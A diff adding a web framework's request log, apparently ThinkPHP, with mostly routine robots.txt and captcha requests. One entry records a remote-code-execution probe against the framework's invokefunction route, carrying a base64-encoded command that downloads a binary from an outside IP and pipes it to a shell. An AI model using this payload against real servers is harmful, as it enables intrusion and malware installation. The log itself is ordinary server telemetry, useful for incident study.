@@ -1,0 +1,24 @@
+[ 2019-09-05T02:49:16+08:00 ] 54.36.148.78 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000189s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-09-05T10:26:20+08:00 ] 89.163.242.18 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000192s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-09-05T15:32:25+08:00 ] 178.32.46.58 /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%24IFS%24()KGN1cmwgLXMgaHR0cDovLzE4NS4xNjQuNzIuMTE5L2xvZ19yb3RhdGUuYmlufHx3Z2V0IC1xIC1PLSBodHRwOi8vMTg1LjE2NC43Mi4xMTkvbG9nX3JvdGF0ZS5iaW4pfHNo%7Cbase64%24IFS%24()-d%7Csh
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000184s ]
+ERR: 无法加载模块:Index
+
+[ 2019-09-05T15:32:27+08:00 ] 178.32.46.58 /index.php?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000185s ]
+ERR: 无法加载模块:Captcha
+
